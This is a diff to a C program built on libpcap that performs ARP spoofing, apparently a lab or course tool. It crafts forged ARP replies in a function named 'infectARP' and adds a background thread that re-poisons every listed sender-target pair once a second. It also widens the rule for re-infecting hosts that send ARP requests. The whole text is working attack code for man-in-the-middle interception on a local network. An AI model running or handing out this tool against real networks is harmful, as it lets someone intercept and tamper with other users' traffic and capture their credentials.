@@ -15,10 +15,12 @@ int main(int argc, char *argv[]){
 	int result;
 	struct ether_header *etherHDR;
 	struct arphdr *arpHDR;
+	pthread_t tid;
 
 	if( argc < 4 ){
 		usage( argv[0] );
 	}
+
 
 	interface = argv[1];
 	handle = pcap_open_live( interface, BUFSIZ, 1, 1000, errbuf );
@@ -35,6 +37,7 @@ int main(int argc, char *argv[]){
 		targetIP = argv[i+1];
 
 		newArg = (struct spoofArgs*)malloc(sizeof(struct spoofArgs));
+		memset(newArg, 0, sizeof(struct spoofArgs));
 
 		newArg->handle = handle;
 		if( inet_pton(AF_INET, senderIP, &(newArg->senderIP) ) != 1 ){
@@ -65,7 +68,9 @@ int main(int argc, char *argv[]){
 		}
 	}
 
-	// TimeSpoof
+	pthread_create(&tid, NULL, &intervalInfect, (void*)head);
+
+	
 	while(1){
 		result = pcap_next_ex( handle, &header, &rcvdPacket );
 		tmpArg = head;
@@ -77,9 +82,7 @@ int main(int argc, char *argv[]){
 			/// CHECK IF ARP WILL RECOVER AND INFECT AGAIN
 			/*
 			1. If Request
-				1. If Sender and Targets are in the list, InfectARP
-				2. If Broadcast by Target, InfectARP
-				3. If Broadcast by Sender, InfectARP 
+				1. If Sender or Target is in the list, infectARP
 			*/
 			arpHDR = (struct arphdr*)((char *)etherHDR + sizeof(struct ether_header));
 			if( (htons(arpHDR->ar_hrd) == ARPHRD_ETHER &&
@@ -102,10 +105,26 @@ int main(int argc, char *argv[]){
 			}
 		}
 	}
+
+	pthread_exit(NULL);
+}
+
+void *intervalInfect(void *args){
+	struct spoofArgs *head = (struct spoofArgs*) args;
+	struct spoofArgs *tmp;
+
+	while(1){
+		usleep(1000000);
+		for(tmp = head; tmp; tmp = tmp->next){
+			infectARP(&tmp->senderMAC, &tmp->senderIP, &tmp->myMAC, &tmp->targetIP, tmp->handle);
+		}
+	}
+
+	return NULL;
 }
 
 
-int infectARP( struct macAddr *senderMAC, struct in_addr *senderIP, struct macAddr *myMAC, struct in_addr *gatewayIP, pcap_t *handle){
+int infectARP( struct macAddr *senderMAC, struct in_addr *senderIP, struct macAddr *myMAC, struct in_addr *targetIP, pcap_t *handle){
 	struct ether_header etherHDR;
 	struct arphdr       arpHDR;
 	uint8_t *packet;
@@ -113,7 +132,6 @@ int infectARP( struct macAddr *senderMAC, struct in_addr *senderIP, struct macAd
 	uint32_t packetSize;
 	struct pcap_pkthdr *header;
 
-	printf("INFECTING!!!\n");
 
 	memcpy( etherHDR.ether_dhost, senderMAC, sizeof(struct macAddr) );
 	memcpy( etherHDR.ether_shost, myMAC, sizeof(struct macAddr) );
@@ -125,17 +143,16 @@ int infectARP( struct macAddr *senderMAC, struct in_addr *senderIP, struct macAd
 	arpHDR.ar_pln = sizeof(struct in_addr);
 	arpHDR.ar_op  = htons(ARPOP_REPLY);
 
-	packetSize = sizeof(struct ether_header) + sizeof(arpHDR) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
-	printf("%d\n", packetSize);
+	packetSize = sizeof(struct ether_header) + sizeof(struct arphdr) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
 	packet = (uint8_t*)malloc( packetSize );
 
 	memcpy( packet + offset, &etherHDR, sizeof(struct ether_header) );
 	offset += sizeof(struct ether_header);
-	memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
-	offset += sizeof(arpHDR);
+	memcpy( packet + offset, &arpHDR, sizeof(struct arphdr) );
+	offset += sizeof(struct arphdr);
 	memcpy( packet + offset, myMAC, sizeof(struct macAddr) );
 	offset += sizeof(struct macAddr);
-	memcpy( packet + offset, gatewayIP, sizeof(struct in_addr) );
+	memcpy( packet + offset, targetIP, sizeof(struct in_addr) );
 	offset += sizeof(struct in_addr);
 	memcpy( packet + offset, senderMAC, sizeof(struct macAddr) );
 	offset += sizeof(struct macAddr);
@@ -269,13 +286,13 @@ struct macAddr *resolveMAC( struct macAddr *senderMAC, struct macAddr *myMAC, st
 	arpHDR.ar_pln = sizeof(struct in_addr);
 	arpHDR.ar_op  = htons(ARPOP_REQUEST);
 
-	packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
+	packetSize = sizeof(etherHDR) + sizeof(struct arphdr) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
 	packet = (uint8_t *)malloc( packetSize );
 
 	memcpy( packet + offset, &etherHDR, sizeof(struct ether_header) );
 	offset += sizeof(etherHDR);
-	memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
-	offset += sizeof(arpHDR);
+	memcpy( packet + offset, &arpHDR, sizeof(struct arphdr) );
+	offset += sizeof(struct arphdr);
 	memcpy( packet + offset, myMAC, sizeof(struct macAddr) );
 	offset += sizeof(struct macAddr);
 	memcpy( packet + offset, myIP, sizeof(struct in_addr) );
